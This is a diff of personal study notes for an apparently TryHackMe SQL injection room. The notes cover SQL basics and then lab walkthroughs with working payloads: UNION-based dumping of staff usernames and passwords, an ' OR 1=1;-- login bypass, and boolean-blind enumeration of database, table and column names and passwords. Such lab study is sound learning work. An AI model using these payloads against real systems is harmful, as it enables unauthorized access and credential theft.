@@ -1,16 +1,3 @@
----
-title: TryHackMe
-author: Mateus Marques
-output:
- html_document:
-  highlight: tango
-urlcolor: magenta
----
-
-```{r load_packages, message=FALSE, warning=FALSE, include=FALSE}
-library(fontawesome)
-```
-
 ## SQL Injection
 
 ### SQL Basics
@@ -26,24 +13,24 @@ SQL (Structured Query Language) is a feature-rich language used for querying dat
 
 * SELECT: The first query type we'll learn is the SELECT query used to retrieve data from the database.
 
-```{sql eval=F}
+```sql
 select * from users;
 ```
 
 The first word `SELECT`, tells the database we want to retrieve some data; the `*` tells the database we want to receive back all columns from the table. `from users` tells the database we want to retrieve the data from the table named users. Finally, the semicolon at the end tells the database that this is the end of the query.
 
 The next query is similar to the above, but this time, instead of using the `*` to return all columns in the database table, we are just requesting the username and password field.
-```{sql eval=F}
+```sql
 select username,password from users;
 ```
 
 The following query, like the first, returns all the columns by using the * selector, and then the "LIMIT 1" clause forces the database to return only one row of data. Changing the query to "LIMIT 1,1" forces the query to skip the first result, and then "LIMIT 2,1" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.
-```{sql eval=F}
+```sql
 select * from users LIMIT 1;
 ```
 
 Lastly, we're going to utilise the where clause; this is how we can finely pick out the exact data we require by returning data that matches our specific clauses:
-```{sql eval=F}
+```sql
 select * from users where username='admin';
 select * from users where username != 'admin';
 select * from users where username='admin' or username='jon';
@@ -54,25 +41,25 @@ select * from users where username like '%mi%';
 
 * UNION: The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type, and the column order has to be the same.
 
-```{sql eval=F}
+```sql
 SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
 ```
 
 * INSERT: The INSERT statement tells the database we wish to insert a new row of data into the table. "into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for and then "values ('bob','password');" provides the data for the previously specified columns.
-```{sql eval=F}
+```sql
 insert into users (username,password) values ('bob','password123');
 ```
 
 * UPDATE: The UPDATE statement tells the database we wish to update one or more rows of data within a table.
-```{sql eval=F}
+```sql
 update users SET username='root',password='pass123' where username='admin';
 ```
 
 * DELETE: The DELETE statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to return, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.
-```{sql eval=F}
+```sql
 delete from users where username='martin';
 ```
-```{sql eval=F}
+```sql
 delete from users;
 ```
 Because no WHERE clause was being used in the query, all the data was deleted from the table.
@@ -91,7 +78,7 @@ https://website.thm/blog?id=1
 ```
 
 From the URL above, you can see that the blog entry selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following:
-```{sql eval=F}
+```sql
 SELECT * from blog where id=1 and private=0 LIMIT 1;
 ```
 
@@ -101,7 +88,7 @@ https://website.thm/blog?id=2;--
 ```
 
 Which would then, in turn, produce the SQL statement:
-```{sql eval=F}
+```sql
 SELECT * from blog where id=2;-- and private=0 LIMIT 1;
 ```
 
@@ -121,19 +108,19 @@ We'll get the database name that we have access to:
 ```
 https://website.thm/article?id=0 union select 1,2,database()
 ```
-```{sql eval=F}
+```sql
 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
 ```
 Firstly, the method `group_concat()` gets the specified column (in our case, `table_name`) from multiple returned rows and puts it into one string separated by commas. The next thing is the `information_schema` database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the `sqli_one` database, which is `article` and `staff_users`.
 
 As the first level aims to discover Martin's password, the `staff_users` table is what interests us. We can utilise the `information_schema` database again to find the structure of this table using the below query.
-```{sql eval=F}
+```sql
 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
 ```
 This is similar to the previous SQL query. However, the information we want to retrieve has changed from `table_name` to `column_name`, the table we are querying in the `information_schema` database has changed from tables to columns, and we're searching for any rows where the `table_name` column has a value of `staff_users`.
 
 The query results provide three columns for the `staff_users` table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.
-```{sql eval=F}
+```sql
 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
 ```
 Again, we use the `group_concat` method to return all of the rows into one string and make it easier to read. We've also added `,':',` to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML `<br>` tag that forces each result to be on a separate line to make for easier reading.
@@ -150,17 +137,17 @@ Taking the above information into account, it's unnecessary to enumerate a valid
 
 
 Level Two of the SQL Injection examples shows this exact example. We can see in the box labelled "SQL Query" that the query to the database is the following:
-```{sql eval=F}
+```sql
 select * from users where username='%username%' and password='%password%' LIMIT 1;
 ```
 
 To make this into a query that always returns as true, we can enter the following into the password field:
-```{sql eval=F}
+```sql
 ' OR 1=1;--
 ```
 
 Which turns the SQL query into the following:
-```{sql eval=F}
+```sql
 select * from users where username='' and password='' OR 1=1;
 ```
 
@@ -176,49 +163,49 @@ The browser body contains `{"taken":true}`.
 The only input we have control over is the username in the query string, and we'll have to use this to perform our SQL injection. Keeping the username as `admin123`, we can start appending to this to try and make the database confirm true things, changing the state of the taken field from false to true.
 
 Like in previous levels, our first task is to establish the number of columns in the users' table, which we can achieve by using the UNION statement. Change the username value to the following:
-```{sql eval=F}
+```sql
 admin123' UNION SELECT 1;--
 ```
 
 As the web application has responded with the value taken as false, we can confirm this is the incorrect value of columns. Keep on adding more columns until we have a taken value of true. You can confirm that the answer is three columns by setting the username to the below value:
-```{sql eval=F}
+```sql
 admin123' UNION SELECT 1,2,3;--
 ```
 
 Now that our number of columns has been established, we can work on the enumeration of the database. Our first task is to discover the database name. We can do this by using the built-in database() method and then using the like operator to try and find results that will return a true status.
-```{sql eval=F}
+```sql
 admin123' UNION SELECT 1,2,3 where database() like '%';--
 ```
 
 We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter s.
-```{sql eval=F}
+```sql
 admin123' UNION SELECT 1,2,3 where database() like 's%';--
 ```
 
 Now you move on to the next character of the database name until you find another true response, for example, 'sa%', 'sb%', 'sc%', etc. Keep on with this process until you discover all the characters of the database name, which is `sqli_three`.
 
 We've established the database name, which we can now use to enumerate table names using a similar method by utilising the `information_schema` database.
-```{sql eval=F}
+```sql
 admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
 ```
 
 This query looks for results in the `information_schema` database in the tables table where the database name matches `sqli_three`, and the table name begins with the letter a. As the above query results in a false response, we can confirm that there are no tables in the `sqli_three` database that begin with the letter a. Like previously, you'll need to cycle through letters, numbers and characters until you find a positive match.
-```{sql eval=F}
+```sql
 admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
 ```
 
 Once you've found the column named `id`, you'll append that to your original payload (as seen below).
-```{sql eval=F}
+```sql
 admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
 ```
 
 Repeating this process three times will enable you to discover the columns' id, username and password. Which now you can use to query the users table for login credentials. First, you'll need to discover a valid username, which you can use the payload below:
-```{sql eval=F}
+```sql
 admin123' UNION SELECT 1,2,3 from users where username like 'a%
 ```
 
 Now you've got the username. You can concentrate on discovering the password. The payload below shows you how to find the password:
-```{sql eval=F}
+```sql
 admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
 ```
 
